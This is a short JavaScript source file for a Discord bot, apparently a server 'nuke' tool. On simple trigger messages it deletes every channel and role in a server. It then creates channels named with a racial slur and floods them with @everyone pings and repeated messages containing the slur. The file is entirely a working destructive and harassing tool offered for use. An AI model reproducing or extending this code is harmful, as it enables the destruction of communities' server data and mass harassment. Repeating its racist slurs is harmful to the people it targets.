const Discord = require('discord.js');
const client = new Discord.Client();


client.login(process.env.TOKEN)


client.on('message', async (message) => {
  if (message.content === 'del') {
    message.guild.channels.cache.forEach(channel => channel.delete());
  }
});



client.on('message', async (message) => {
  if (message.content === 'nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());

    await message.guild.channels.create(`get nuked nigger`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content === '@everyone') {
    await message.guild.channels.create(`Get nuked nigger`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    message.channel.send('@everyone Get nuked nigga')
    })
  }
})
